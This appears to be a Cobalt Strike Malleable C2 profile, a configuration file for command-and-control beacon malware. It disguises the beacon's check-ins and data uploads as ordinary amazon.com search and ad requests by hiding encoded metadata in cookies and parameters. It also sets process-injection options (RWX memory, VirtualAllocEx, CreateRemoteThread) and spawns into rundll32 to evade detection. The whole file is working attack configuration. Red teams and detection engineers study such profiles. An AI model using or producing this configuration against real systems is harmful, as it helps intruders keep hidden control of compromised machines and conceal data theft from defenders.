set sleeptime "5000";
set jitter "0";
set spawnto_x86 "%windir%\syswow64\rundll32.exe";
set spawnto_x64 "%windir%\sysnative\rundll32.exe";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    set verb "GET";

    server {

        output {
            print;
        }
    }

    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";

        metadata {
            base64;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
            header "Cookie";
        }
    }
}

http-post {
    set verb "POST";
    set uri "/N4215/adj/amzn.us.sr.aps";

    client {
        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "www.amazon.com";
        parameter "sz" "160x600";
        parameter "oe" "oe=ISO-8859-1;";
        parameter "s" "3717";
        parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";

        id {
            parameter "sn";
        }

        output {
            base64;
            print;
        }
    }
}

stage {
    set cleanup "0";
}

process-inject {
    set startrwx "true";
    set userwx "true";

    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
    set allocator "VirtualAllocEx";
}
